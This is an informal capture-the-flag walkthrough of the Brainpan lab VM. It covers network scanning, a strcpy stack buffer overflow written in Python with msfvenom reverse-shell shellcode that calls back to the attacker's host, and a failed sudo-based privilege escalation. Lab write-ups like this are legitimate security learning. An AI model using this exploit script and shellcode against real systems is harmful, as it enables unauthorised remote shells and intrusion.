Reconnaissance:

Started by finding the host on the network.

nmap -sS -O 192.168.118.0/24

192.168.118.185 looks guilty.

Enumeration:

root@kali:~/brainpan# nmap -A -T4 192.168.118.185

Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-19 19:22 MDT
Nmap scan report for 192.168.118.185
Host is up (0.00047s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings:
|   NULL:
|     _| _|
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.40%I=7%D=5/19%Time=591F9A53%P=x86_64-pc-linux-gnu%r(NU
SF:LL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|
SF:\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\
SF:x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x
SF:20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
SF:20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x
SF:20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|
SF:\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
SF:20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x
SF:20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x
SF:20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_
SF:\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x
SF:20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x
SF:20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x
SF:20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
MAC Address: 00:0C:29:5F:77:79 (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.47 ms 192.168.118.185

Oh...a strange box with it's own little game.  Typically, I'm not a big fan, but I'll dig more.

root@kali:~/brainpan# nikto -h http://192.168.118.185:10000
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.118.185
+ Target Hostname:    192.168.118.185
+ Target Port:        10000
+ Start Time:         2017-05-19 19:27:18 (GMT-6)
---------------------------------------------------------------------------
+ Server: SimpleHTTP/0.6 Python/2.7.3
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Python/2.7.3 appears to be outdated (current is at least 2.7.5)
+ SimpleHTTP/0.6 appears to be outdated (current is at least 1.2)
+ OSVDB-3092: /bin/: This might be interesting...
+ OSVDB-3092: /bin/: This might be interesting... possibly a system shell found.
+ ERROR: Error limit (20) reached for host, giving up. Last error: error reading HTTP response
+ Scan terminated:  20 error(s) and 7 item(s) reported on remote host
+ End Time:           2017-05-19 19:27:27 (GMT-6) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
root@kali:~/brainpan# dirb http://192.168.118.185:10000

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri May 19 19:27:57 2017
URL_BASE: http://192.168.118.185:10000/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.118.185:10000/ ----
+ http://192.168.118.185:10000/bin (CODE:301|SIZE:0)                                                                   
+ http://192.168.118.185:10000/index.html (CODE:200|SIZE:215)                                                          

-----------------
END_TIME: Fri May 19 19:28:02 2017
DOWNLOADED: 4612 - FOUND: 2
root@kali:~/brainpan#

Browsing to http://192.168.118.185/bin has an executable, brainpan.exe.

I'll bite, lets see what strings can tell us.

root@kali:~/brainpan# strings brainpan.exe
!This program cannot be run in DOS mode.
.text
`
[^_]
[get_reply] s = [%s]
[get_reply] copied %d bytes to buffer
shitstorm
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|
[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD                              
                          >>
                          ACCESS DENIED
                          ACCESS GRANTED
[+] initializing winsock...
[!] winsock init failed: %d
done.
[!] could not create socket: %d
[+] server socket created.
[!] bind failed: %d
[+] bind done on port %d
[+] waiting for connections.
[+] received connection.
[+] check is %d
[!] accept failed: %d
[+] cleaning up.

It looks like shitstorm is the password, but I still get ACCESS DENIED.

I cheated and looked up a walkthough....I was on the right track, even had the right password.

https://www.mogozobo.com/?p=2324

msfencode has been replaced, so i changed the command.

root@kali:~/brainpan# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.118.180 LPORT=443 -f python
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of python file: 342 bytes
buf =  ""
buf += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
buf += "\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0"
buf += "\xa8\x76\xb4\x68\x02\x00\x01\xbb\x89\xe1\xb0\x66\x50"
buf += "\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73"
buf += "\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0"
buf += "\x0b\xcd\x80"


#!/usr/bin/python
# etFuzz.py - Xerubus' malleable fuzzer

import sys,socket

victim = '192.168.118.185'
port = 9999

junk = "\x41" * 524
eip = "\xf3\x12\x17\x31" #jmp esp 311712F3 brainpan.exe
buf =  ""
buf += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
buf += "\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0"
buf += "\xa8\x76\xb4\x68\x02\x00\x01\xbb\x89\xe1\xb0\x66\x50"
buf += "\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73"
buf += "\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0"
buf += "\x0b\xcd\x80"

payload = junk + eip + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  print "[-] Connecting to " + str(victim)
  s.connect((victim, port))
  s.recv(1024)

  # Send payload
  print "[-] Sending payload.... ",
  s.send(payload)
  print "Done"

except:
  print "[-] Unable to connect to " + str(victim)
  sys.exit(0)

root@kali:~/brainpan# python fuzz.py
[-] Connecting to 192.168.118.185
[-] Sending payload....  Done

I don't get the reverse shell, my shellcode is much smaller.  Back to messing with msfvenom.

root@kali:~/brainpan# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.118.180 LPORT=443 R -e x86/alpha_upper -b "\x00" -f python
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_upper
x86/alpha_upper succeeded with size 205 (iteration=0)
x86/alpha_upper chosen with final size 205
Payload size: 205 bytes
Final size of python file: 990 bytes
buf =  ""
buf += "\x89\xe2\xd9\xce\xd9\x72\xf4\x5d\x55\x59\x49\x49\x49"
buf += "\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33"
buf += "\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41"
buf += "\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41"
buf += "\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a"
buf += "\x4a\x49\x36\x51\x59\x4b\x5a\x57\x4a\x43\x51\x43\x37"
buf += "\x33\x51\x43\x33\x5a\x35\x52\x4d\x59\x4d\x31\x38\x30"
buf += "\x55\x36\x38\x4d\x4d\x50\x4d\x43\x36\x39\x4e\x50\x47"
buf += "\x4f\x38\x4d\x4d\x50\x30\x49\x44\x39\x4b\x49\x33\x58"
buf += "\x4f\x30\x49\x38\x42\x56\x58\x34\x33\x58\x35\x52\x35"
buf += "\x50\x45\x51\x4f\x4b\x4b\x39\x4b\x51\x38\x30\x43\x56"
buf += "\x36\x30\x46\x31\x56\x33\x4e\x53\x55\x53\x4b\x39\x4d"
buf += "\x31\x38\x4d\x4b\x30\x56\x32\x45\x38\x52\x4e\x46\x4f"
buf += "\x42\x53\x32\x48\x55\x38\x36\x4f\x46\x4f\x45\x32\x45"
buf += "\x39\x4b\x39\x4a\x43\x36\x32\x30\x53\x4b\x39\x4b\x51"
buf += "\x58\x30\x34\x4b\x58\x4d\x4d\x50\x41\x41"

That looks better!  Too bad it still doesn't work.

root@kali:~/brainpan# cat fuzz.py
#!/usr/bin/python
# etFuzz.py - Xerubus' malleable fuzzer

import sys,socket

victim = '192.168.118.185'
port = 9999

junk = "\x41" * 524
eip = "\xf3\x12\x17\x31" #jmp esp 311712F3 brainpan.exe
buf = "\x90" * 13 + (
"\x89\xe2\xd9\xce\xd9\x72\xf4\x5d\x55\x59\x49\x49\x49"
"\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33"
"\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41"
"\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41"
"\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a"
"\x4a\x49\x36\x51\x59\x4b\x5a\x57\x4a\x43\x51\x43\x37"
"\x33\x51\x43\x33\x5a\x35\x52\x4d\x59\x4d\x31\x38\x30"
"\x55\x36\x38\x4d\x4d\x50\x4d\x43\x36\x39\x4e\x50\x47"
"\x4f\x38\x4d\x4d\x50\x30\x49\x44\x39\x4b\x49\x33\x58"
"\x4f\x30\x49\x38\x42\x56\x58\x34\x33\x58\x35\x52\x35"
"\x50\x45\x51\x4f\x4b\x4b\x39\x4b\x51\x38\x30\x43\x56"
"\x36\x30\x46\x31\x56\x33\x4e\x53\x55\x53\x4b\x39\x4d"
"\x31\x38\x4d\x4b\x30\x56\x32\x45\x38\x52\x4e\x46\x4f"
"\x42\x53\x32\x48\x55\x38\x36\x4f\x46\x4f\x45\x32\x45"
"\x39\x4b\x39\x4a\x43\x36\x32\x30\x53\x4b\x39\x4b\x51"
"\x58\x30\x34\x4b\x58\x4d\x4d\x50\x41\x41")

payload = junk + eip + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
      print "[-] Connecting to " + str(victim)
      s.connect((victim, port))
      s.recv(1024)

      # Send payload
      print "[-] Sending payload.... ",
      s.send(payload)
      print "Done"

except:
      print "[-] Unable to connect to " + str(victim)
      sys.exit(0)
root@kali:~/brainpan#

LOOK!  I fixed my python script...it works now.

uname -r
3.5.0-25-generic
cat /proc/version
Linux version 3.5.0-25-generic (buildd@lamiak) (gcc version 4.7.2 (Ubuntu/Linaro 4.7.2-2ubuntu1) ) #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013

sudo su
sudo: no tty present and no askpass program specified

It has worked before :)

sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util


What is this anansi_util?  I'm going to start by making my shell interactive.

python -c 'import pty;pty.spawn("/bin/sh")'

Fighting with sudo....no, your a no tty present and no askpass program specified!

echo '' | sudo -S /home/anansi/bin/anansi_util
Where [action] is one of:
  - network
  - proclist
  - manual [command]

sudo -S /home/anansi/bin/anansi_util manual /bin/sh

Hmm, I was expecting that to work.  From looking back at the walkthough they did the same thing.  Same results after rebooting the VM.  Well, at lest i learned a bunch about msfvenom and strcpy buffer overflows.
